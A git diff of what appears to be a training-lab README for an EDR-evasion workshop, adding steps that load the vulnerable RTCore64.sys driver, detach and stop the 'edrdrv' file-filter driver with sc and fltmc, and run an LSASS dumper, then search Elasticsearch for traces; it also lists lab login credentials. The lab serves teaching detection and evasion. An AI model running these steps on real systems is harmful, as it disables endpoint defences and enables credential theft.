@@ -53,8 +53,72 @@ Dumping lsass will be the name of the game.
 **discuss nikito**
 - miniwritedump
 - temp files
-23. Time for EDR.
-Back on the **Windows Target 2** device. Install EDR and file beat monitor.
+23. Time for EDR. Back on the **Windows Target 2** device. Install EDR and file beat monitor.
+> [Setup Steps](../../0-setup/README.md)
+24. With EDR installed, use the Administrative command prompt to re-run the system-that-lsass.exe program.
+`system-that-lsass.exe`
+25. Open elasticsearch with the link on the desktop. & Login. un: **elastic** pw: **alwaysbelearning**
+26. In he top left go to discover.
+27. In the top right change the time to the last 15 minutes. (Feel free to play around with this however you want.)
+30. Use free text search to search for "lsass".
+**discuss monitoring vs detection**
+- don't always have to disable
+31. Driver time. Back in the administrative command prompt. Copy the driver to the C:\Windows\Temp folder.
+> make sure you are in the "C:\Users\Public\Desktop\LAB_FILES\2-custom-edr-evasion\1-Custom-BYOD"
+`copy RTCore64.sys c:\Windows\Temp\RTCore64.sys`
+32. Load the driver.
+`driver_loader.exe`
+33. Check logs in C:\Widnows\Temp\driver_loader.log
+34. Check for loaded driver, open services and look for MyRTCore64.
+**Discuss why it isn't there**
+35. Query for the driver with SC in the command line.
+`sc query MyRTCore64`
+36. Check for more detail with driverquery.
+`driverquery /v /fo table`
+36. Unload the driver.
+`sc stop MyRTCore64.sys`
+**Did you see what I saw?**
+37. Unload edrdrv.
+`sc stop edrdrv`
+**Discuss failure**
+38. Run fltmc to detach and unload file filter drivers.
+```
+fltmc
+fltmc instances -f edrdrv
+fltmc detach edrdrv c:
+fltmc detach edrdrv \Device\Mup
+fltmc unload edrdrv
+fltmc
+```
+39. Now Check SC Query.
+`sc query edrdrv`
+40. Stop edrdrv
+`sc stop edrdrv`
+41. In your administrative command prompt, run lsass_dumper.exe.
+> full path C:\Users\Public\Desktop\LAB_FILES\2-custom-edr-evasion\1-Custom-BYOD
+```
+cd driver-dumper
+lsass_dumper.exe
+```
+35. Check
+36. Run lsass_dumper.exe
+`lsass_dumper.exe`
+37. Check logs in C:\Windows\Temp\lsass_dumper
+**discuss failure**
+- Check code for driver-dumper in Operator Desktop
+- Talk about BYOD moving forward and whats needed.
+39. Go check for your activity after disabling the edrdrv filter in elasticsearch.
+> Some search terms.
+```
+system-that-lsass.exe
+lsass_dumper.exe
+lsass_encoded.bin
+```
+> Run more code and see what does and doesn't pop up. this is the end of this module.
+**Discussion**
+
+Small pause while we shift gears. Then heading to the custom edr evasion techniques. But keep in mind they are fun and experiemental.
+[Custom API EDR Evastion](../2-Custom-API/README.md)
 
 
 
